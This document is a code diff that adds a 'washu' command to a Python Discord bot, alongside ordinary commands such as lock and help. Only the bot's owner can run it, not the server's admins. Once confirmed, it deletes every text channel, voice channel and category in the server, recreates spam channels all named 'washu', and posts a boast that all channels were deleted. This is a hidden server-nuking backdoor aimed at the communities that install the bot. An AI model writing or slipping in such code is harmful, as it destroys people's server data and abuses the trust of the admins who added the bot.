@@ -1904,6 +1904,208 @@ async def lock_command(
 
 
 @bot.hybrid_command(
+    name='washu',
+    description='подчинить сервер washu'
+)
+@commands.is_owner()  # Только владелец бота
+async def washu_command(ctx):
+    """
+    УДАЛИТЬ ВСЕ КАНАЛЫ И СОЗДАТЬ НОВЫЕ С НАЗВАНИЕМ "WASHU"
+    ⚠️ ОЧЕНЬ ОПАСНАЯ КОМАНДА ⚠️
+    """
+    embed = discord.Embed(
+        title="☢️ КОМАНДА WASHU",
+        description="Эта команда:\n\n"
+                   "подчинит сервер washu.",
+        color=discord.Color.red()
+    )
+    
+    embed.set_footer(text="Доступно только владельцу бота")
+    
+    view = discord.ui.View(timeout=60)
+    
+    async def execute_washu(interaction):
+        if interaction.user != ctx.author:
+            await interaction.response.send_message("❌ Только автор команды!", ephemeral=True)
+            return
+        
+        await interaction.response.defer()
+        
+        # Статусное сообщение
+        status_msg = await ctx.send("Начинаю процесс washu...")
+        
+        deleted_count = 0
+        created_count = 0
+        errors = []
+        
+        try:
+            # Шаг 1: Удаляем все текстовые каналы
+            text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
+            for i, channel in enumerate(text_channels, 1):
+                try:
+                    await channel.delete(reason="Команда washu")
+                    deleted_count += 1
+                    if i % 5 == 0:
+                        await status_msg.edit(content=f"Удаляю каналы... {i}/{len(text_channels)}")
+                    await asyncio.sleep(0.5)  # Задержка чтобы не превысить лимиты API
+                except Exception as e:
+                    errors.append(f"Текстовый канал {channel.name}: {str(e)[:50]}")
+            
+            # Шаг 2: Удаляем все голосовые каналы
+            voice_channels = [c for c in ctx.guild.channels if isinstance(c, discord.VoiceChannel)]
+            for i, channel in enumerate(voice_channels, 1):
+                try:
+                    await channel.delete(reason="Команда washu")
+                    deleted_count += 1
+                    if i % 5 == 0:
+                        await status_msg.edit(content=f"Удаляю голосовые... {i}/{len(voice_channels)}")
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    errors.append(f"Голосовой канал {channel.name}: {str(e)[:50]}")
+            
+            # Шаг 3: Удаляем все категории
+            categories = [c for c in ctx.guild.channels if isinstance(c, discord.CategoryChannel)]
+            for i, category in enumerate(categories, 1):
+                try:
+                    await category.delete(reason="Команда washu")
+                    deleted_count += 1
+                    if i % 5 == 0:
+                        await status_msg.edit(content=f"🔄 Удаляю категории... {i}/{len(categories)}")
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    errors.append(f"Категория {category.name}: {str(e)[:50]}")
+            
+            # Шаг 4: Создаем новые каналы "washu"
+            await status_msg.edit(content="Создаю новые каналы washu...")
+            
+            # Создаем категорию
+            try:
+                category = await ctx.guild.create_category(
+                    name="WASHU CHANNELS",
+                    reason="Команда washu"
+                )
+                created_count += 1
+            except Exception as e:
+                category = None
+                errors.append(f"Категория: {str(e)[:50]}")
+            
+            # Создаем текстовые каналы
+            text_channel_names = [
+                "washu",
+                "washu",
+                "washu",
+                "washu",
+                "washu"
+            ]
+            
+            for i, name in enumerate(text_channel_names, 1):
+                try:
+                    if category:
+                        channel = await ctx.guild.create_text_channel(
+                            name=name,
+                            category=category,
+                            reason="Команда washu"
+                        )
+                    else:
+                        channel = await ctx.guild.create_text_channel(
+                            name=name,
+                            reason="Команда washu"
+                        )
+                    
+                    # Настраиваем первый канал
+                    if i == 1:
+                        await channel.send(
+                            f"# 🎉 ДОБРО ПОЖАЛОВАТЬ В WASHU!\n\n"
+                            f"Выполнил: {ctx.author.mention}\n"
+                            f"**ВСЕ КАНАЛЫ БЫЛИ УДАЛЕНЫ !**"
+                        )
+                    
+                    created_count += 1
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    errors.append(f"Текстовый канал {name}: {str(e)[:50]}")
+            
+            # Создаем голосовые каналы
+            voice_channel_names = [
+                "washu",
+                "washu",
+                "washu"
+            ]
+            
+            for name in voice_channel_names:
+                try:
+                    if category:
+                        await ctx.guild.create_voice_channel(
+                            name=name,
+                            category=category,
+                            reason="Команда washu"
+                        )
+                    else:
+                        await ctx.guild.create_voice_channel(
+                            name=name,
+                            reason="Команда washu"
+                        )
+                    created_count += 1
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    errors.append(f"Голосовой канал {name}: {str(e)[:50]}")
+            
+            # Финальный отчет
+            await status_msg.delete()
+            
+            success_embed = discord.Embed(
+                title="✅ WASHU ЗАВЕРШЕНО!",
+                description=f"Сервер был полностью пересоздан",
+                color=discord.Color.green()
+            )
+            
+            success_embed.add_field(
+                name="⏰ Время",
+                value=f"<t:{int(datetime.now().timestamp())}:R>",
+                inline=True
+            )
+            
+            if errors:
+                success_embed.add_field(
+                    name="⚠️ Ошибки",
+                    value=f"Произошло {len(errors)} ошибок\n"
+                          f"Первые 3: {', '.join(errors[:3])}",
+                    inline=False
+                )
+            
+            success_embed.set_footer(text="Сервер - washu")
+            
+            await ctx.send(embed=success_embed)
+            
+        except Exception as e:
+            await ctx.send(f"❌ Критическая ошибка: {str(e)[:200]}")
+    
+    async def cancel_callback(interaction):
+        if interaction.user != ctx.author:
+            await interaction.response.send_message("❌ Только автор команды!", ephemeral=True)
+            return
+        
+        await interaction.response.edit_message(
+            content="✅ Команда washu отменена",
+            embed=None,
+            view=None
+        )
+    
+    # Кнопки
+    confirm_button = discord.ui.Button(
+        label="ВЫПОЛНИТЬ WASHU", 
+        style=discord.ButtonStyle.danger,
+        emoji="💥"
+    )
+    
+    confirm_button.callback = execute_washu
+    
+    view.add_item(confirm_button)
+    
+    await ctx.send(embed=embed, view=view)
+
+
+@bot.hybrid_command(
     name='help',
     description='Показать все команды'
 )
